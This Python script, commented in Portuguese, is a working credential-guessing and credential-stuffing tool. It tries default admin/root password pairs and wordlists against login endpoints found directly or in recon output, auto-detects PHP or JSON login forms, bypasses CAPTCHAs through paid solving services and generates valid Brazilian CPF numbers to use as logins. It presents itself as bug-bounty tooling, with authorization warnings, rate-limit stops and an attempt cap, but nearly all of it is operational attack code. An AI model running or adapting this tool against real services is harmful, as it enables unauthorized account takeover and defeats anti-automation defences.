#!/usr/bin/env python3
"""
credcheck.py — Teste de credenciais padrão / credential stuffing

Testa combinações de usuário/senha em endpoints de login detectados.
Detecta rate limiting e para automaticamente.

Uso:
  python3 credcheck.py --url https://alvo.com/api/login
  python3 credcheck.py --url https://alvo.com/api/login --wordlist senhas.txt
  python3 credcheck.py pasta_recon/   (detecta endpoints de login automaticamente)

ATENÇÃO: só em alvos autorizados. Muitas tentativas podem bloquear conta.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[✘] pip install requests")
    sys.exit(1)

# ── credenciais padrão mais comuns ───────────────────────────
CREDENCIAIS_DEFAULT: list[tuple[str, str]] = [
    ("admin",     "admin"),
    ("admin",     "password"),
    ("admin",     "123456"),
    ("admin",     "admin123"),
    ("admin",     ""),
    ("root",      "root"),
    ("root",      "toor"),
    ("root",      "password"),
    ("user",      "user"),
    ("user",      "password"),
    ("test",      "test"),
    ("guest",     "guest"),
    ("demo",      "demo"),
    ("operator",  "operator"),
    ("sa",        ""),
    ("admin",     "admin@123"),
    ("admin",     "Admin@123"),
    ("administrator", "administrator"),
    ("admin",     "letmein"),
    ("admin",     "qwerty"),
]

# ── campos comuns de login em APIs REST ───────────────────────
CAMPOS_LOGIN = [
    {"username": "{user}", "password": "{pass}"},
    {"email":    "{user}", "password": "{pass}"},
    {"user":     "{user}", "password": "{pass}"},
    {"login":    "{user}", "password": "{pass}"},
    {"usuario":  "{user}", "senha":    "{pass}"},
]

# ── indicadores de sucesso ────────────────────────────────────
SUCESSO_INDICADORES = [
    "token", "access_token", "jwt", "session",
    "dashboard", "welcome", "logged", "success",
    "authenticated", "autorizado",
]

FALHA_INDICADORES = [
    "invalid", "incorrect", "wrong", "failed",
    "unauthorized", "forbidden", "inválid", "incorret",
    "não autorizado", "senha incorreta", "usuário não encontrado",
]

# ── argumentos ────────────────────────────────────────────────
parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument("pasta",   nargs="?", help="Pasta de saída do recon")
group.add_argument("--url",   help="URL do endpoint de login")
parser.add_argument("--wordlist",  help="Arquivo com senhas (uma por linha)")
parser.add_argument("--usuario",   help="Usuário fixo para testar (testa várias senhas)")
parser.add_argument("--timeout",   type=int,   default=10)
parser.add_argument("--delay",     type=float, default=1.0,
                    help="Delay entre tentativas em segundos (padrão: 1s)")
parser.add_argument("--max-tentativas", type=int, default=30,
                    help="Máximo de tentativas por endpoint (padrão: 30)")
parser.add_argument("--output",    default=".")
parser.add_argument("--captcha-modo", default="skip",
                    choices=["skip", "manual", "2captcha", "anticaptcha"],
                    help="Como resolver CAPTCHAs no formulário de login")
parser.add_argument("--captcha-key", default="",
                    help="API key do 2captcha ou anticaptcha")
parser.add_argument("--tipo", default="auto",
                    choices=["auto", "json", "php"],
                    help="Tipo de login: auto (detecta), json (REST API), php (form-urlencoded)")
parser.add_argument("--cpf", action="store_true",
                    help="Login via CPF: usa lista de CPFs de teste + senhas")
parser.add_argument("--cpf-valor", default="",
                    help="CPF específico para testar (ex: 123.456.789-09)")
parser.add_argument("--cpf-gerar", type=int, default=0,
                    help="Gerar N CPFs válidos aleatórios para testar")
args = parser.parse_args()

# ── importar CPF utils ────────────────────────────────────────
try:
    from cpf_utils import (
        validar_cpf, formatar_cpf, credenciais_cpf,
        detectar_campo_cpf, CPFS_TESTE,
    )
    _CPF_OK = True
except ImportError:
    _CPF_OK = False

# ── importar PHPLoginHandler ──────────────────────────────────
try:
    from php_login import PHPLoginHandler, CREDENCIAIS_PHP
    _PHP_OK = True
except ImportError:
    _PHP_OK = False
    PHPLoginHandler = None

OUTPUT_DIR    = Path(args.output)
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
RESULTADO_FILE = OUTPUT_DIR / "credcheck_findings.txt"

# ── CAPTCHA solver ────────────────────────────────────────────
try:
    from captcha_solver import CaptchaSolver
    CAPTCHA = CaptchaSolver(
        modo    = args.captcha_modo,
        api_key = args.captcha_key or os.environ.get("CAPTCHA_API_KEY", ""),
        verbose = True,
    )
    if args.captcha_modo != "skip":
        print(f"[→] CAPTCHA modo: {args.captcha_modo}")
except ImportError:
    CAPTCHA = None

SESSION = requests.Session()
SESSION.verify = False
SESSION.headers.update({
    "User-Agent":   "Mozilla/5.0 (compatible; BugBountyScanner)",
    "Content-Type": "application/json",
    "Accept":       "application/json",
})

HITS:         list[dict] = []
TOTAL:        int = 0
RATE_LIMITED: bool = False

# ── detecção automática de tipo de login ──────────────────────
def detectar_tipo_login(url: str) -> str:
    """
    Detecta automaticamente se o endpoint é PHP (form) ou REST (JSON).
    Retorna 'php' ou 'json'.
    """
    # forçado pelo usuário
    if args.tipo != "auto":
        return args.tipo

    indicadores_php = [
        # URL
        ".php" in url,
        "wp-login" in url,
        "login.php" in url,
        "signin.php" in url,
        "auth.php"  in url,
        "/admin/"   in url and ".php" not in url,  # padrão WordPress
    ]

    if any(indicadores_php):
        return "php"

    # GET na URL e inspecionar a resposta
    try:
        resp = SESSION.get(url, timeout=5, allow_redirects=True)
        headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
        html    = resp.text.lower()
        ct      = headers.get("content-type", "")

        sinais_php = [
            # headers
            "php" in headers.get("x-powered-by", ""),
            "phpsessid" in headers.get("set-cookie", ""),
            # HTML
            "wp-login" in html,
            "wordpress" in html,
            "_token"    in html,
            "_csrf"     in html,
            "form"      in html and 'type="hidden"' in html,
            "laravel"   in html,
            "joomla"    in html,
            "drupal"    in html,
            # content-type
            "text/html" in ct,
        ]

        sinais_json = [
            "application/json" in ct,
            "/api/" in url,
            "/rest/" in url,
            "/graphql" in url,
        ]

        score_php  = sum(sinais_php)
        score_json = sum(sinais_json)

        tipo = "php" if score_php >= score_json else "json"
        print(f"  [→] Detecção automática: {tipo.upper()} "
              f"(score php={score_php} json={score_json})")
        return tipo

    except Exception:
        return "json"  # fallback

def detectar_sucesso(resp: requests.Response) -> bool:
    texto = resp.text.lower()
    if resp.status_code in (200, 201):
        return any(s in texto for s in SUCESSO_INDICADORES)
    return False

def detectar_rate_limit(resp: requests.Response) -> bool:
    return resp.status_code in (429, 503) or "too many" in resp.text.lower()

def detectar_bloqueio(resp: requests.Response) -> bool:
    texto = resp.text.lower()
    return any(w in texto for w in ["blocked", "bloqueado", "captcha", "banned"])

def testar_credencial(url: str, usuario: str, senha: str) -> dict | None:
    global TOTAL, RATE_LIMITED
    TOTAL += 1

    for campos in CAMPOS_LOGIN:
        body = {k: v.replace("{user}", usuario).replace("{pass}", senha)
                for k, v in campos.items()}
        try:
            # resolver CAPTCHA se presente na página de login
            token_captcha = ""
            if CAPTCHA and args.captcha_modo != "skip":
                pagina_login = SESSION.get(url, timeout=args.timeout)
                token_captcha = CAPTCHA.resolver_requests(pagina_login.text, url)
                if token_captcha:
                    body["g-recaptcha-response"] = token_captcha
                    body["h-captcha-response"]   = token_captcha
                    body["captcha"]              = token_captcha

            resp = SESSION.post(url, json=body, timeout=args.timeout,
                                allow_redirects=False)

            if detectar_rate_limit(resp):
                RATE_LIMITED = True
                print(f"\n  [!] Rate limit detectado! Parando.")
                return None

            if detectar_bloqueio(resp):
                print(f"\n  [!] Possível bloqueio detectado.")
                return None

            if detectar_sucesso(resp):
                return {
                    "url":      url,
                    "usuario":  usuario,
                    "senha":    senha,
                    "campos":   body,
                    "status":   resp.status_code,
                    "resposta": resp.text[:500],
                }

        except requests.exceptions.ConnectionError:
            print(f"  [✘] Conexão recusada: {url}")
            return None
        except Exception:
            pass

    return None

def testar_endpoint(url: str) -> None:
    global RATE_LIMITED

    print(f"\n[→] Testando: {url}")

    # ── montar lista de senhas ────────────────────────────────
    if args.wordlist:
        senhas = [s.strip() for s in
                  Path(args.wordlist).read_text(errors="ignore").splitlines()
                  if s.strip()]
    else:
        senhas = [s for _, s in CREDENCIAIS_DEFAULT]

    # ── montar credenciais ────────────────────────────────────
    if args.cpf or args.cpf_valor or args.cpf_gerar:
        if not _CPF_OK:
            print("  [!] cpf_utils.py não encontrado — usando modo padrão")
            credenciais = CREDENCIAIS_DEFAULT
        else:
            cpfs_extras = [args.cpf_valor] if args.cpf_valor else []
            credenciais = credenciais_cpf(
                senhas           = senhas,
                cpfs_extras      = cpfs_extras,
                gerar_aleatorios = args.cpf_gerar,
                com_mascara      = True,
            )
            print(f"  [→] Modo CPF — {len(set(c for c,_ in credenciais))} CPFs × {len(senhas)} senhas")

    elif args.usuario and args.wordlist:
        credenciais = [(args.usuario, s) for s in senhas]

    elif args.wordlist:
        usuarios_padrao = ["admin", "root", "user", "test"]
        credenciais = [(u, s) for u in usuarios_padrao for s in senhas]

    else:
        credenciais = CREDENCIAIS_DEFAULT

    credenciais = credenciais[:args.max_tentativas]

    # ── detectar tipo e rotear ────────────────────────────────
    tipo = detectar_tipo_login(url)

    if tipo == "php" and _PHP_OK:
        _testar_php(url, credenciais)
    else:
        if tipo == "php" and not _PHP_OK:
            print("  [!] php_login.py não encontrado — usando modo JSON")
        _testar_json(url, credenciais)


def _testar_php(url: str, credenciais: list[tuple[str, str]]) -> None:
    """Rota PHP: usa PHPLoginHandler com form-urlencoded + CSRF."""
    global RATE_LIMITED

    # usar credenciais PHP se forem as padrão
    creds = credenciais if credenciais != CREDENCIAIS_DEFAULT else CREDENCIAIS_PHP
    creds = creds[:args.max_tentativas]

    handler = PHPLoginHandler(
        url_login      = url,
        delay          = args.delay,
        timeout        = args.timeout,
        captcha_solver = CAPTCHA,
    )

    if not handler.preparar():
        print("  [✘] Falha ao carregar página de login PHP")
        return

    hits_php = handler.testar_lista(creds, output_dir=OUTPUT_DIR)

    for h in hits_php:
        HITS.append({
            "url":      url,
            "tipo":     "php",
            "usuario":  h.usuario,
            "senha":    h.senha,
            "status":   "200/redirect",
            "resposta": h.evidencia,
            "framework": h.framework,
            "cookies":  list(h.cookies.keys()),
        })


def _testar_json(url: str, credenciais: list[tuple[str, str]]) -> None:
    """Rota JSON: usa POST com application/json."""
    global RATE_LIMITED

    print(f"  [→] Modo JSON — {len(credenciais)} combinações")

    for i, (usuario, senha) in enumerate(credenciais):
        if RATE_LIMITED:
            break

        sys.stdout.write(f"\r  [→] {i+1}/{len(credenciais)} — {usuario}:{senha[:10]}...")
        sys.stdout.flush()

        hit = testar_credencial(url, usuario, senha)
        if hit:
            HITS.append(hit)
            print(f"\n  [✔] CREDENCIAL VÁLIDA: {usuario}:{senha}")
            print(f"      Status: {hit['status']}")
            print(f"      Resposta: {hit['resposta'][:150]}")

        time.sleep(args.delay)

    print()

# ── encontrar endpoints de login na pasta de recon ────────────
def encontrar_endpoints_login(pasta: Path) -> list[str]:
    endpoints = []
    # endpoints descobertos pelo fuzzing
    fuzz_file = pasta / "fuzzing" / "todos_endpoints.txt"
    if fuzz_file.exists():
        for linha in fuzz_file.read_text(errors="ignore").splitlines():
            partes = linha.split()
            if len(partes) >= 3:
                url = partes[2]
                if any(p in url.lower() for p in ["login", "auth", "signin", "token", "oauth"]):
                    endpoints.append(url)

    # JWT/auth do classificador
    jwt_file = pasta / "classificacao" / "jwt_auth.txt"
    if jwt_file.exists():
        for linha in jwt_file.read_text(errors="ignore").splitlines():
            if linha.startswith("URL   : "):
                endpoints.append(linha.replace("URL   : ", "").strip())

    return list(set(endpoints))[:10]  # limita a 10 endpoints

# ── execução ──────────────────────────────────────────────────
print(f"\n{'='*55}")
print("  credcheck.py — Teste de credenciais padrão")
print(f"  Delay: {args.delay}s  |  Máx: {args.max_tentativas} tentativas")
print(f"  Modo: {args.tipo.upper()}  |  PHP: {'✔' if _PHP_OK else '✘ php_login.py ausente'}")
print(f"{'='*55}")
print("  [!] Use APENAS em alvos com autorização escrita.")
print(f"{'='*55}\n")

if args.url:
    testar_endpoint(args.url)
else:
    pasta = Path(args.pasta)
    endpoints = encontrar_endpoints_login(pasta)
    if not endpoints:
        print("[!] Nenhum endpoint de login encontrado na pasta de recon.")
        print("    Use --url para especificar um endpoint diretamente.")
        sys.exit(0)
    print(f"[→] {len(endpoints)} endpoints de login encontrados")
    for ep in endpoints:
        if not RATE_LIMITED:
            testar_endpoint(ep)

# ── relatório ─────────────────────────────────────────────────
with open(RESULTADO_FILE, "w") as f:
    f.write(f"# credcheck — Resultados\n")
    f.write(f"# Total tentativas: {TOTAL}  |  Hits: {len(HITS)}\n\n")
    if RATE_LIMITED:
        f.write("# ⚠ Rate limit detectado — teste incompleto\n\n")
    for h in HITS:
        f.write(f"{'='*60}\n")
        f.write(f"URL       : {h['url']}\n")
        f.write(f"Tipo      : {h.get('tipo', 'json').upper()}\n")
        if h.get("framework"):
            f.write(f"Framework : {h['framework']}\n")
        f.write(f"Usuário   : {h['usuario']}\n")
        f.write(f"Senha     : {h['senha']}\n")
        f.write(f"Status    : {h['status']}\n")
        f.write(f"Evidência : {h['resposta']}\n")
        if h.get("cookies"):
            f.write(f"Cookies   : {h['cookies']}\n")
        f.write("\n")

print(f"\n{'='*55}")
print(f"  Tentativas : {TOTAL}")
print(f"  Hits       : {len(HITS)}")
if RATE_LIMITED:
    print(f"  ⚠ Rate limit detectado — reduza --delay")
print(f"  Relatório  : {RESULTADO_FILE}")
print(f"{'='*55}")
